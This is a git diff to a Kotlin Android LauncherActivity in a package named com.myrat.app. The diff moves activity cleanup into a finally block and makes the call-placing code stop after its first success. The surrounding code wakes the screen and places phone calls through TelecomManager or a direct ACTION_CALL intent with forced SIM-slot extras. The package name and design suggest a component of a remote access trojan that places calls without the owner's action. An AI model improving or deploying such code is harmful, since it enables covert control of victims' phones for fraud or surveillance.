@@ -36,11 +36,12 @@ class LauncherActivity : AppCompatActivity() {
                 "com.myrat.app.ACTION_MAKE_CALL" -> handleMakeCall()
                 else -> {
                     Logger.error("❌ Unknown action in LauncherActivity: ${intent.action}")
-                    finish()
                 }
             }
         } catch (e: Exception) {
             Logger.error("❌ Error in LauncherActivity onCreate", e)
+        } finally {
+            // Always finish the activity
             finish()
         }
     }
@@ -75,8 +76,6 @@ class LauncherActivity : AppCompatActivity() {
             Logger.error("❌ Failed to launch URL from LauncherActivity", e)
         } catch (e: Exception) {
             Logger.error("❌ Error handling URL in LauncherActivity", e)
-        } finally {
-            finish()
         }
     }
 
@@ -98,8 +97,6 @@ class LauncherActivity : AppCompatActivity() {
             Logger.error("❌ Failed to launch app from LauncherActivity", e)
         } catch (e: Exception) {
             Logger.error("❌ Error handling app launch in LauncherActivity", e)
-        } finally {
-            finish()
         }
     }
 
@@ -114,7 +111,6 @@ class LauncherActivity : AppCompatActivity() {
 
             if (recipient.isNullOrEmpty() || subId == -1) {
                 Logger.error("❌ Invalid call parameters: recipient=$recipient, subId=$subId")
-                finish()
                 return
             }
 
@@ -128,29 +124,35 @@ class LauncherActivity : AppCompatActivity() {
 
             if (!hasCallPhonePermission || !hasReadPhoneStatePermission) {
                 Logger.error("❌ Missing permissions for call: CALL_PHONE=$hasCallPhonePermission, READ_PHONE_STATE=$hasReadPhoneStatePermission")
-                finish()
                 return
             }
 
             // Wake up screen if needed for call
             wakeUpScreen()
             
-            // Try multiple call methods
+            // Try call methods in order - ONLY ONE AT A TIME
             var callSuccess = false
             
             // Method 1: Try TelecomManager (Android 6+)
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !callSuccess) {
                 callSuccess = tryTelecomManagerCall(recipient, subId, simSlotIndex)
+                if (callSuccess) {
+                    Logger.log("✅ Call successful via TelecomManager")
+                    return // Exit immediately on success
+                }
             }
             
-            // Method 2: Try direct Intent.ACTION_CALL
+            // Method 2: Try direct Intent.ACTION_CALL (only if TelecomManager failed)
             if (!callSuccess) {
                 callSuccess = tryDirectCall(recipient, subId, simSlotIndex)
+                if (callSuccess) {
+                    Logger.log("✅ Call successful via direct Intent")
+                    return // Exit immediately on success
+                }
             }
             
-            if (callSuccess) {
-                Logger.log("✅ Call initiated successfully from LauncherActivity")
-            } else {
+            // If we reach here, all methods failed
+            if (!callSuccess) {
                 Logger.error("❌ All call methods failed in LauncherActivity")
             }
 
@@ -158,13 +160,13 @@ class LauncherActivity : AppCompatActivity() {
             Logger.error("❌ SecurityException while placing call: ${e.message}", e)
         } catch (e: Exception) {
             Logger.error("❌ Failed to place call in LauncherActivity: ${e.message}", e)
-        } finally {
-            finish()
         }
     }
 
     private fun tryTelecomManagerCall(recipient: String, subId: Int, simSlotIndex: Int): Boolean {
         return try {
+            Logger.log("📞 Trying TelecomManager call...")
+            
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                 val telecomManager = getSystemService(TELECOM_SERVICE) as? TelecomManager
                 if (telecomManager == null) {
@@ -202,6 +204,8 @@ class LauncherActivity : AppCompatActivity() {
 
     private fun tryDirectCall(recipient: String, subId: Int, simSlotIndex: Int): Boolean {
         return try {
+            Logger.log("📞 Trying direct Intent call...")
+            
             val callIntent = Intent(Intent.ACTION_CALL, Uri.parse("tel:$recipient")).apply {
                 putExtra("com.android.phone.force.slot", true)
                 putExtra("com.android.phone.extra.slot", simSlotIndex)
